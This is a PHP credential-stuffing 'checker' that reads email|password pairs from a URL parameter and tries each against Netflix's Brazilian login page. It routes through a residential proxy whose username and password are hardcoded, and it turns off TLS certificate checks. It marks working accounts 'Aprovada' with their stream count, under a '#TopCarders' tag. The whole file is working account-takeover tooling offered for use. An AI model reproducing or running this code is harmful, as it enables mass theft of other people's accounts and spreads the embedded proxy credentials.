<?php
function getStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
ini_set('default_charset','UTF-8');
$proxy = ''; // PROXY
$proxy_auth = ''; // PROXY
error_reporting(0);
set_time_limit(0);
$lista = $_GET['lista'];
$separa = explode('|', $lista);
$email = $separa[0];
$senha = $separa[1];
if (file_exists(getcwd().'/netflix.txt')) {
    unlink(getcwd().'/netflix.txt');
}

if(!$email or !$senha){
	echo "<span class='label label-vermelho'>#REPROVADA</span> $email|$senha | Retorno: Email/Senha incorretos";
	die();
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.netflix.com/br/login");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/netflix.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/netflix.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy = 'http://zproxy.lum-superproxy.io:22225');  
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth = 'lum-customer-hl_8d2b6f71-zone-masterbank
:z9c88il0co3v');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($ch);

$authurl = getStr($data, 'name="authURL" value="','"');

curl_setopt($ch, CURLOPT_URL, "https://www.netflix.com/br/login");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/netflix.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/netflix.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);  
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'userLoginId='.$email.'&password='.$senha.'&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode&authURL='.$authurl.'&nextPage=&showPassword=&countryCode=%2B55&countryIsoCode=BR');
$data = curl_exec($ch);
if(empty($data)){
	echo "<span class='label label-vermelho'>#ERRO</span> $email|$senha";
	return;
}elseif(strstr($data, 'We are having technical difficulties and are ')){
	echo "<span class='label label-vermelho'>#ERRO</span> $email|$senha";
	return;
}

if(strpos($data, 'Gerenciar perfis</a>')){
	curl_setopt($ch, CURLOPT_URL, "https://www.netflix.com/YourAccount");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/netflix.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/netflix.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
	$data = curl_exec($ch);
	$telas = getStr($data, '"maxStreams":',',');
	 echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha Plano: $telas  Tela(s)<font style='color: MidnightBlue;'>#TopCarders</font></b>";



        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'></font>";
        }
?>